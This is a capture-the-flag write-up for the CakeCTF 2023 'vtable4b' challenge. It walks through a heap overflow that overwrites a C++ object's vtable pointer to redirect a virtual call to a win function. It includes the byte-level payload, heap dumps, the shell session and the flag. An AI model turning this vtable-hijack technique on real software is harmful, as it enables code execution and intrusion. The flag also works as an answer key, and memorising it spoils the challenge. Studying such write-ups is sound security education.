# vtable4b

## Source

Do you understand what vtable is?

nc vtable4b.2023.cakectf.com 9000
* The flag exists somewhere in / directory.

## Challenge

```
Today, let's learn how to exploit C++ vtable!
You're going to abuse the following C++ class:

  class Cowsay {
  public:
    Cowsay(char *message) : message_(message) {}
    char*& message() { return message_; }
    virtual void dialogue();

  private:
    char *message_;
  };

An instance of this class is allocated in the heap:

  Cowsay *cowsay = new Cowsay(new char[0x18]());

You can
 1. Call `dialogue` method:
  cowsay->dialogue();

 2. Set `message`:
  std::cin >> cowsay->message();

Last but not least, here is the address of `win` function which you should call to get the flag:
  <win> = 0x5640a00eb61a

1. Use cowsay
2. Change message
3. Display heap
```

### Finding a path
1. The win function will help us get the flag so we have to call it.
2. We can display the heap to see addresses of the return calls.
3. We can change a value in the heap - we can use this to override return calls.
4. We can call the `cowsay->dialogue()` function with option 1 , so we have to change the return address of that.

### Display Heap

```

  [ address ]    [ heap data ]
               +------------------+
0x55aef2fe5ea0 | 0000000000000000 |
               +------------------+
0x55aef2fe5ea8 | 0000000000000021 |
               +------------------+
0x55aef2fe5eb0 | 0000000000000000 | <-- message (= '')
               +------------------+
0x55aef2fe5eb8 | 0000000000000000 |
               +------------------+
0x55aef2fe5ec0 | 0000000000000000 |
               +------------------+
0x55aef2fe5ec8 | 0000000000000021 |
               +------------------+
0x55aef2fe5ed0 | 000055aef2d76ce8 | ---------------> vtable for Cowsay
               +------------------+                 +------------------+
0x55aef2fe5ed8 | 000055aef2fe5eb0 |  0x55aef2d76ce8 | 000055aef2d736e2 |
               +------------------+                 +------------------+
0x55aef2fe5ee0 | 0000000000000000 |                 --> Cowsay::dialogue
               +------------------+
0x55aef2fe5ee8 | 000000000000f121 |
               +------------------+

```

- The pointer to vtable for Cowsay is at address `0x55aef2fe5ed0`
- `Cowsay->dialogue()` function is calling the address stored in the Cowsay vtable which has a pointer at `0x55aef2fe5ed0`

## Pwning

1. Change the pointer at `0x55aef2fe5ed0` to make the program believe the vtable of Cowsay is at a different location - say `0x55aef2fe5ed8`, the next address.
2. Change the value of the new address `0x55aef2fe5ed0` is pointing to so that it calls `win()` instead of `Cowsay->dialogue()`

- We can do this by sending a value so big in message that it overrides the next addresses 

### Payload crafting

``` Payload = b'' ```

- All adresses before `0x55aef2fe5ed0` shall remain untouched. 
``` Payload += bytes.fromhex('0000000000000000')[::-1] + bytes.fromhex('0000000000000000')[::-1] + bytes.fromhex('0000000000000000')[::-1] + bytes.fromhex('0000000000000021')[::-1] ```

- Overwriting the pointer in vtable address to `0x55aef2fe5ed8`.
``` Payload += bytes.fromhex('000055aef2fe5ed8')[::-1] ```

- Overwriting the pointer in dialogue() call address to `win()` address = `0x55aef2d7361a`
``` Payload += bytes.fromhex('000055aef2d7361a')[::-1] ```

### Sending Payload
```

  [ address ]    [ heap data ]
               +------------------+
0x55aef2fe5ea0 | 0000000000000000 |
               +------------------+
0x55aef2fe5ea8 | 0000000000000021 |
               +------------------+
0x55aef2fe5eb0 | 0000000000000000 |
               +------------------+
0x55aef2fe5eb8 | 0000000000000000 |
               +------------------+
0x55aef2fe5ec0 | 0000000000000000 |
               +------------------+
0x55aef2fe5ec8 | 0000000000000021 |
               +------------------+
0x55aef2fe5ed0 | 000055aef2fe5ed8 | ---------------> vtable for Cowsay (corrupted)
               +------------------+                 +------------------+
0x55aef2fe5ed8 | 000055aef2d7361a |  0x55aef2fe5ed8 | 000055aef2d7361a |
               +------------------+                 +------------------+
0x55aef2fe5ee0 | 0000000000000000 |                 --> <win> function
               +------------------+
0x55aef2fe5ee8 | 000000000000f121 |
               +------------------+
```
- The Heap has changed and the Cowsay->dialogue() fucntion will call win() function now.

- Call the function and after getting the shell find the flag

```
>> cd ..
>> ls
app
bin
boot
dev
etc
flag-806cb9c9719379667ca5616d9c8210f1.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
>> cat flag-806cb9c9719379667ca5616d9c8210f1.txt
CakeCTF{vt4bl3_1s_ju5t_4n_arr4y_0f_funct1on_p0int3rs}
```

## Flag

The flag is `CakeCTF{vt4bl3_1s_ju5t_4n_arr4y_0f_funct1on_p0int3rs}`